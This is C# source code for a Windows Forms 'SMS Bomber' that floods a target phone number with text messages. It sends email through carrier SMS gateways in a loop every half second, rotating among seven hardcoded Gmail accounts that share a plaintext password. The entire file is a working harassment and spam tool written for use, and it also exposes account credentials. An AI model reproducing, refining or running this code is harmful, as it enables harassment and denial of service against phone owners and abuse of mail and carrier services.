using System.Windows.Forms;
using System;
using System.Net.Mail;
using System.Threading;
namespace SMS_Bomber
{
    public partial class Spammer : Form
    {
        public Spammer()
        {
            InitializeComponent();
        }
        public class SMSBomber
        {
            public static string[] Senders = new string[] { "bomberdivision.1@gmail.com", "bomberdivision.2@gmail.com", "bomberdivision.3@gmail.com", "bomberdivision.4@gmail.com", "bomberdivision.5@gmail.com", "bomberdivision.6@gmail.com", "bomberdivision.7@gmail.com" };
            public static bool running;
            public static int index;
            public class Providers
            {
                public static string Provider(int Provider)
                {
                   switch (Provider)
                    {
                        case 0: return "@vtext.com";
                        case 1: return "@txt.att.net";
                        case 2: return "@messaging.sprintpcs.com";
                        case 3: return "@tmomail.net";
                    }
                    return null;
                }          
            }
        }
        private void ProviderSelction_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (ProviderSelction.SelectedIndex)
            {
                case 0: SMSBomber.index = 0; break;
                case 1: SMSBomber.index = 1; break;
                case 2: SMSBomber.index = 2; break;
                case 3: SMSBomber.index = 3; break;
                default: return;
            }
        }
        private void StartSpam_Click(object sender, EventArgs e)
        {
            if (numberInput.Mask == "##########")
            {
                SMSBomber.running = true;
                if (!backgroundWorker1.IsBusy)
                {
                    backgroundWorker1.RunWorkerAsync();
                }
            }
            else
            {
                MessageBox.Show("Please Enter A Valid Ten Digit Phone Number.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void backgroundWorker1_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            while (SMSBomber.running == true)
            {
                if (backgroundWorker1.CancellationPending)
                {
                    return;
                }
                Random r = new Random();
                int attacker = r.Next(0, 7);
                SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587)
                {
                    UseDefaultCredentials = false,
                    Credentials = new System.Net.NetworkCredential(SMSBomber.Senders[attacker], "Fuckass123."),
                    EnableSsl = true
                };
                smtpClient.Send(SMSBomber.Senders[attacker], numberInput.Text + SMSBomber.Providers.Provider(SMSBomber.index), null, spamText.Text);
                Thread.Sleep(500);
            }
        }
        private void StopSpam_Click(object sender, EventArgs e)
        {
            backgroundWorker1.CancelAsync();
            SMSBomber.running = false;
        }
    }
}

